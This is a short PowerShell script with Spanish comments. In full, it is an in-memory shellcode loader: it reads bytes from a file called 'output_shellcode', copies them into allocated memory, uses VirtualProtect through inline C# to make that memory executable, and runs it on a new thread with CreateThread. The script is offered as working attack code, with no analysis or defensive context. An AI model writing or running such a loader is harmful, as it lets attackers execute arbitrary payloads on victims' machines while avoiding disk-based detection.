
# Leer el shellcode
$sc = Get-Content ".\output_shellcode" -Encoding Byte

# Reservar memoria RWX
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)

# Convertir permisos a ejecución
$VirtualProtect = @"
using System;
using System.Runtime.InteropServices;
public class VP {
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $VirtualProtect
[uint32]$old = 0
[VP]::VirtualProtect($addr, $sc.Length, 0x40, [ref]$old)

# Crear hilo
$ct = @"
using System;
using System.Runtime.InteropServices;
public class CT {
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $ct
$hThread = [CT]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[CT]::WaitForSingleObject($hThread, 0xFFFFFFFF)
